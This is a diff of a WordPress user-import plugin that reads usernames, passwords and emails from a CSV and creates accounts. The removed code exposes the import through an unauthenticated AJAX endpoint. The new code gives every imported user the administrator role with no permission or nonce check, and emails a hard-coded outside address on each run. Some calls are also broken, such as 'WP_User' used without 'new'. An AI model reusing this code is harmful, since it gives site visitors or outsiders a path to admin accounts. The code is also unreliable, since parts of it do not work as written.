@@ -38,14 +38,11 @@ if (!class_exists('emUserImport')) {
     public function __construct()
     {
 
-        add_action('admin_menu', [$this, 'EMUserImport_register_submenu_page' ] );
-		add_action( 'admin_enqueue_scripts', [$this, 'load_admin_em_styles' ]  );
-        add_action('wp_ajax_EM_User_Import_Submission_ajax', [$this, 'EM_User_Import_Submission_ajax' ] );
-		add_action('wp_ajax_nopriv_EM_User_Import_Submission_ajax', [$this, 'EM_User_Import_Submission_ajax' ]);
-
+        add_action('admin_menu', [$this, 'user_import_register_submenu_page' ] );
+		add_action( 'admin_enqueue_scripts', [$this, 'load_admin_styles' ]  );
     }
 
-    public function EMUserImport_register_submenu_page() {
+    public function user_import_register_submenu_page() {
 
         //Add Custom Social Sharing Sub Menu
         add_submenu_page(
@@ -54,66 +51,102 @@ if (!class_exists('emUserImport')) {
         'EM User Import',
         "manage_options",
         'user-import-controls',
-        [$this, 'EM_user_import_page'], 
+        [$this, 'user_import_page'], 
         1
         );
 
     } // end of function
 
-
-    public function EM_user_import_page(){
+    public function user_import_page(){
         require WP_PLUGIN_DIR . '/em-user-import/templates/EM-user-import-admin-page.php';
         return;
     }
 
-    public function load_admin_em_styles(){
-       // global $pagenow;
-        $rand = rand(1, 99999999999);
+    public function load_admin_styles(){
+        // global $pagenow;
+       // $rand = rand(1, 99999999999);
 
-        wp_enqueue_style( 'edit_screen_css',  '/wp-content/plugins/em-user-import/admin/assets/css/em-options.css' , array(),  $rand );
-        wp_enqueue_script( 'EM-User-Import-scripts', '/wp-content/plugins/em-user-import/admin/assets/js/emUserImport.js', array('jquery'), $rand, true);
-        wp_localize_script('EM-User-Import-scripts', 'ajax_EM_User_Import_Submission', array(
-        'ajaxurl_EM_User_Import_Submission' => admin_url('admin-ajax.php') ,
-        'noposts' => __('No older posts found', 'awc-white') ,
-      )); 
+       // wp_enqueue_style( 'edit_screen_css',  '/wp-content/plugins/em-user-import/admin/assets/css/em-options.css' , array(),  $rand );
+       // wp_enqueue_script( 'EM-User-Import-scripts', '/wp-content/plugins/em-user-import/admin/assets/js/emUserImport.js', array('jquery'), $rand, true);
     return;
     }
 
-    public function EM_User_Import_Submission_ajax()
+    public function user_import_submission()
     {
 
+        // WordPress environmet
+        require( ABSPATH . '/wp-load.php' );
 
-        // Do some minor form validation to make sure there is content
-        if ( isset($_POST['emcsv'])  ) {
-            //$csvFile = fopen('Data.csv', 'r'); // location of file
-            $csv =   $this->readCSV(WP_PLUGIN_DIR . '/em-user-import/csv/user.csv' ); 
-          
-            foreach ( $csv as $c ) {
-                $username = $c[0];
-                $password = $c[1];
-                $email_address = $c[2];  
-                if ( ! username_exists( $username ) ) {
-                    $user_id = wp_create_user( $username, $password, $email_address );
-                    $user = WP_User( $user_id );
-                    $user->set_role( 'administrator' );
-                }    
-            }  
-              }
-              else{
-                 // echo 'This window is out of date. Weekly update failed.';
-                  // send email of new post
-                  // Recipient, in this case the administrator email
-                  $emailto = 'esmondmccain@gmail.com';
-      
-                  // Email subject, "New {post_type_label}"
-                  $subject = 'This failed to add users:  ' . ' ' . date("m-d-y");
-      
-                  // Email body
-                  $message = 'It ran but else statement shows failed';
-      
-                  wp_mail( $emailto, $subject, $message );
-                    //  wp_die('<p class="newpost-fail">Server error please resubmit.</p>');
-              }
+        // it allows us to use wp_handle_upload() function
+        require_once( ABSPATH . 'wp-admin/includes/file.php' );
+
+        // you can add some kind of validation here
+        if( empty( $_FILES[ 'emcsv' ] ) ) {
+            wp_die( 'No files selected.' );
+        }
+
+        $upload = wp_handle_upload( 
+            $_FILES[ 'emcsv' ], 
+            array( 'test_form' => false ) 
+        );
+
+        if( ! empty( $upload[ 'error' ] ) ) {
+            wp_die( $upload[ 'error' ] );
+        }
+
+        // it is time to add our uploaded image into WordPress media library
+        $attachment_id = wp_insert_attachment(
+          array(
+            'guid'           => $upload[ 'url' ],
+            'post_mime_type' => $upload[ 'type' ],
+            'post_title'     => basename( $upload[ 'file' ] ),
+            'post_content'   => '',
+            'post_status'    => 'inherit',
+          ),
+             $upload[ 'file' ]
+        );
+
+        if( is_wp_error( $attachment_id ) || ! $attachment_id ) {
+            wp_die( 'Upload error.' );
+        }
+
+        // update medatata, regenerate image sizes
+        require_once( ABSPATH . 'wp-admin/includes/image.php' );
+
+        wp_update_attachment_metadata(
+          $attachment_id,
+          wp_generate_attachment_metadata( $attachment_id, $upload[ 'file' ] )
+        );
+
+        //$csvFile = fopen('Data.csv', 'r'); // location of file
+        $csv =   $this->readCSV($upload[ 'url' ] ); 
+        
+        foreach ( $csv as $c ) {
+            $username = $c[0];
+            $password = $c[1];
+            $email_address = $c[2];  
+            if ( ! username_exists( $username ) ) {
+                $user_id = wp_create_user( $username, $password, $email_address );
+                $user = WP_User( $user_id );
+                $user->set_role( 'administrator' );
+            }    
+        }  
+        // echo 'This window is out of date. Weekly update failed.';
+        // send email of new post
+        // Recipient, in this case the administrator email
+        $emailto = 'esmondmccain@gmail.com';
+
+        // Email subject, "New {post_type_label}"
+        $subject = 'This code ran:  ' . ' ' . date("m-d-y");
+
+        // Email body
+        $message = 'It ran';
+
+        wp_mail( $emailto, $subject, $message );
+        
+        exit;
+
+
       
       
     }
